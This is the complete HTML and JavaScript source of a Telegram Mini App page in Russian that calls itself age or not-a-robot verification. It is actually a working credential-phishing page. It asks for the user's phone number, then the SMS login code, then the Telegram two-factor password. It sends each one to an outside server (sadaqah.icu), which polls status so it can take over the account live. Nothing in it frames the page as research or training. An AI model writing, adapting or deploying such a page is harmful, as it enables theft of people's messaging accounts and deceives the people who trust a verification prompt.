<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Verification</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --buttonText: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
      --shadow: 0 12px 30px rgba(0,0,0,.25);
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; }
    body {
      color: var(--text);
      background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
                  radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
                  var(--bg);
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      -webkit-font-smoothing: antialiased;
      padding: calc(14px + env(safe-area-inset-top)) 16px calc(20px + env(safe-area-inset-bottom));
      display: flex;
      justify-content: center;
    }
    .wrap {
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }
    .card {
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border: 1px solid rgba(255,255,255,.10);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 20px 16px;
      backdrop-filter: blur(10px);
    }
    .top {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
    }
    .title { font-size: 19px; font-weight: 700; margin: 0; }
    .subtitle { margin: 6px 0 0; color: var(--hint); font-size: 13.5px; line-height: 1.4; }
    .pill {
      padding: 8px 12px;
      border-radius: 999px;
      background: var(--secondary);
      color: var(--hint);
      font-size: 12px;
      border: 1px solid rgba(255,255,255,.08);
      white-space: nowrap;
    }
    .codeBox {
      margin: 16px 0 8px;
      display: flex;
      justify-content: center;
      padding: 16px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(0,0,0,.12);
    }
    .codeDots {
      display: flex;
      gap: 12px;
      max-width: 320px;
    }
    .dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: rgba(255,255,255,.14);
      border: 1px solid rgba(255,255,255,.12);
      transition: all .15s ease;
    }
    .dot.filled {
      background: rgba(46,166,255,.95);
      border-color: rgba(46,166,255,.6);
      transform: scale(1.08);
    }
    .hintRow {
      display: flex;
      justify-content: space-between;
      color: var(--hint);
      font-size: 12.5px;
      margin-top: 4px;
    }
    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
    }
    .key {
      height: clamp(54px, 9.8vh, 74px);
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.10);
      background: rgba(255,255,255,.06);
      color: var(--text);
      font-size: 23px;
      font-weight: 700;
      box-shadow: 0 8px 18px rgba(0,0,0,.18);
      transition: all .1s ease;
      touch-action: manipulation;
    }
    .key:active { transform: translateY(2px) scale(0.97); opacity: 0.9; }
    .key.primary {
      background: linear-gradient(180deg, rgba(46,166,255,.95), rgba(46,166,255,.75));
      border-color: rgba(46,166,255,.55);
      color: white;
    }
    .key.icon { font-size: 22px; color: var(--hint); }
    .spacer { opacity: 0; pointer-events: none; }
    .loading { text-align: center; padding: 40px 0; color: var(--hint); font-size: 16px; }
    .btn-primary {
      background: var(--button);
      color: var(--buttonText);
      border: none;
      border-radius: var(--radius);
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      width: 100%;
      margin-top: 12px;
      cursor: pointer;
    }
    .twofa-input {
      width: 100%;
      padding: 14px;
      border-radius: var(--radius);
      border: 1px solid rgba(255,255,255,.2);
      background: rgba(0,0,0,.3);
      color: var(--text);
      font-size: 16px;
      margin: 12px 0;
    }
    .hidden { display: none !important; }
  </style>
</head>
<body>
  <div class="wrap">
    <div id="loadingBlock" class="card loading">Загрузка...</div>

    <div id="phoneBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">Подтверждение возраста</p>
          <p class="subtitle">Поделитесь номером телефона, чтобы мы убедились, что вы не робот.</p>
        </div>
        <div class="pill" id="phoneDisplay">Не получен</div>
      </div>
      <button id="sharePhoneBtn" class="btn-primary">Поделиться номером</button>
      <p style="margin-top:12px; text-align:center; color:var(--hint); font-size:12px;">
        Мы не сохраняем ваш номер на устройстве
      </p>
    </div>

    <div id="codeBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">Код подтверждения</p>
          <p class="subtitle">Введите код из SMS (придёт за 5–30 секунд)</p>
        </div>
        <div class="pill" id="codePhoneDisplay">—</div>
      </div>
      <div class="codeBox">
        <div class="codeDots" id="codeDots"></div>
      </div>
      <div class="hintRow">
        <span id="progressHint">0 / 5</span>
        <span>Удалить: ⌫</span>
      </div>
    </div>

    <div id="twofaBlock" class="card hidden">
      <div class="top">
        <div>
          <p class="title">Двухфакторная аутентификация</p>
          <p class="subtitle">Введите пароль от вашего аккаунта Telegram</p>
        </div>
        <div class="pill" id="twofaPhoneDisplay">—</div>
      </div>
      <input type="password" id="twofaInput" class="twofa-input" placeholder="Пароль" autocomplete="off" />
      <button id="submit2faBtn" class="btn-primary">Подтвердить</button>
    </div>

    <div class="keyboard card hidden" id="keyboard"></div>

    <div class="footerNote" style="text-align:center; color:var(--hint); font-size:12px; margin-top:8px;">
      Данные обрабатываются конфиденциально
    </div>
  </div>

  <script>
    (function () {
      const WebApp = window.Telegram?.WebApp;
      if (!WebApp) {
        alert("Это приложение работает только внутри Telegram");
        return;
      }

      WebApp.ready();
      WebApp.expand();
      WebApp.MainButton.setParams({ color: "#2ea6ff", text_color: "#ffffff" });

      const user = WebApp.initDataUnsafe?.user;
      if (!user?.id) {
        alert("Не удалось получить данные пользователя");
        return;
      }
      const userId = user.id;

      // DOM элементы
      const els = {
        loading: document.getElementById("loadingBlock"),
        phone: document.getElementById("phoneBlock"),
        code: document.getElementById("codeBlock"),
        twofa: document.getElementById("twofaBlock"),
        keyboard: document.getElementById("keyboard"),
        phoneDisplay: document.getElementById("phoneDisplay"),
        codePhoneDisplay: document.getElementById("codePhoneDisplay"),
        twofaPhoneDisplay: document.getElementById("twofaPhoneDisplay"),
        codeDots: document.getElementById("codeDots"),
        progressHint: document.getElementById("progressHint"),
        sharePhoneBtn: document.getElementById("sharePhoneBtn"),
        twofaInput: document.getElementById("twofaInput"),
        submit2faBtn: document.getElementById("submit2faBtn"),
      };

      const CODE_LENGTH = 5;
      let code = "";
      let currentPhone = localStorage.getItem("tg_phone") || "";
      let phoneShared = !!currentPhone;
      let pollingTimer = null;

      function maskPhone(phone) {
        if (!phone) return "—";
        const digits = phone.replace(/\D/g, "");
        return digits.length >= 4 ? "****" + digits.slice(-4) : phone;
      }

      function showScreen(screen) {
        Object.values(els).forEach(el => el?.classList?.add?.("hidden"));
        if (screen === "loading") els.loading.classList.remove("hidden");
        else if (screen === "phone") {
          els.phone.classList.remove("hidden");
          els.keyboard.classList.add("hidden");
          WebApp.MainButton.hide();
          if (phoneShared && currentPhone) {
            els.phoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
            startPolling();
          }
        }
        else if (screen === "code") {
          els.code.classList.remove("hidden");
          els.keyboard.classList.remove("hidden");
          if (currentPhone) {
            els.codePhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
          }
          renderCodeDots();
          WebApp.MainButton.hide();
        }
        else if (screen === "2fa") {
          els.twofa.classList.remove("hidden");
          els.keyboard.classList.add("hidden");
          if (currentPhone) {
            els.twofaPhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
          }
          WebApp.MainButton.hide();
        }
      }

      function renderCodeDots() {
        els.codeDots.innerHTML = "";
        for (let i = 0; i < CODE_LENGTH; i++) {
          const dot = document.createElement("div");
          dot.className = "dot" + (i < code.length ? " filled" : "");
          els.codeDots.appendChild(dot);
        }
        els.progressHint.textContent = `${code.length} / ${CODE_LENGTH}`;
      }

      function haptic(type = "light") {
        WebApp.HapticFeedback?.impactOccurred?.(type);
      }

      function addDigit(d) {
        if (code.length >= CODE_LENGTH) return;
        code += d;
        haptic("light");
        renderCodeDots();
        if (code.length === CODE_LENGTH) {
          WebApp.MainButton.setText("Подтвердить").show().onClick(submitCode);
        } else {
          WebApp.MainButton.hide();
        }
      }

      function deleteDigit() {
        if (code.length === 0) return;
        code = code.slice(0, -1);
        haptic("light");
        renderCodeDots();
        if (code.length === CODE_LENGTH) {
          WebApp.MainButton.show();
        } else {
          WebApp.MainButton.hide();
        }
      }

      async function submitCode() {
        if (code.length !== CODE_LENGTH) return;
        WebApp.MainButton.showProgress(true).disable();

        try {
          const res = await fetch("https://sadaqah.icu/submit_code", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ user_id: userId, phone: currentPhone, code }),
          });
          const data = await res.json();

          if (data.status === "ok") {
            haptic("success");
            WebApp.close();
          } else if (data.status === "2fa_required") {
            showScreen("2fa");
            haptic("medium");
          } else {
            haptic("error");
            alert(data.message || "Неверный код");
            code = "";
            renderCodeDots();
          }
        } catch (err) {
          haptic("error");
          alert("Ошибка сети. Попробуйте позже.");
        } finally {
          WebApp.MainButton.hideProgress().enable();
        }
      }

      async function submit2FA() {
        const password = els.twofaInput.value.trim();
        if (!password) return alert("Введите пароль");

        els.submit2faBtn.disabled = true;
        els.submit2faBtn.textContent = "Проверка...";

        try {
          const res = await fetch("https://sadaqah.icu/submit_2fa", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ user_id: userId, password }),
          });
          const data = await res.json();

          if (data.status === "ok") {
            haptic("success");
            WebApp.close();
          } else {
            alert(data.message || "Неверный пароль");
            els.twofaInput.value = "";
          }
        } catch (err) {
          alert("Ошибка сети");
        } finally {
          els.submit2faBtn.disabled = false;
          els.submit2faBtn.textContent = "Подтвердить";
        }
      }

      async function requestPhoneNumber() {
        if (phoneShared) return;

        try {
          const contact = await WebApp.requestContact();
          if (contact?.contact?.phone_number) {
            currentPhone = contact.contact.phone_number;
            localStorage.setItem("tg_phone", currentPhone);
            phoneShared = true;
            els.phoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
            els.codePhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
            els.twofaPhoneDisplay.textContent = `Тел: ${maskPhone(currentPhone)}`;
            haptic("success");
            startPolling();
          } else {
            alert("Не удалось получить номер. Попробуйте ещё раз.");
          }
        } catch (err) {
          alert("Вы отменили запрос номера.\nНажмите кнопку ещё раз, если готовы поделиться.");
        }
      }

      function startPolling() {
        if (pollingTimer) clearInterval(pollingTimer);

        pollingTimer = setInterval(async () => {
          try {
            const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
            const { state } = await res.json();

            if (state === "get_code") {
              clearInterval(pollingTimer);
              pollingTimer = null;
              showScreen("code");
            } else if (state === "get_2fa") {
              clearInterval(pollingTimer);
              pollingTimer = null;
              showScreen("2fa");
            }
          } catch {}
        }, 1800);
      }

      // ─── Инициализация ────────────────────────────────────────

      showScreen("loading");

      (async () => {
        try {
          const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
          const { state } = await res.json();

          if (state === "get_code" || state === "get_2fa") {
            if (phoneShared && currentPhone) {
              showScreen(state === "get_code" ? "code" : "2fa");
              startPolling();
            } else {
              showScreen("phone");
            }
          } else {
            showScreen("phone");
          }
        } catch {
          showScreen("phone");
        }
      })();

      // События
      els.sharePhoneBtn.addEventListener("click", requestPhoneNumber);
      els.submit2faBtn.addEventListener("click", submit2FA);

      // Клавиатура
      const keysLayout = ["1","2","3","4","5","6","7","8","9","spacer","0","del"];
      keysLayout.forEach(k => {
        const btn = document.createElement("button");
        btn.className = "key";
        if (k === "spacer") {
          btn.classList.add("spacer");
        } else if (k === "del") {
          btn.classList.add("icon");
          btn.textContent = "⌫";
          btn.onclick = deleteDigit;
        } else {
          btn.textContent = k;
          btn.onclick = () => addDigit(k);
        }
        els.keyboard.appendChild(btn);
      });

      // Клавиатура ПК
      window.addEventListener("keydown", e => {
        if (els.code.classList.contains("hidden")) return;
        if (e.key >= "0" && e.key <= "9") addDigit(e.key);
        if (e.key === "Backspace") deleteDigit();
        if (e.key === "Enter" && code.length === CODE_LENGTH) submitCode();
      });

      // Очистка при закрытии
      window.addEventListener("beforeunload", () => {
        if (pollingTimer) clearInterval(pollingTimer);
      });
    })();
  </script>
</body>
</html>
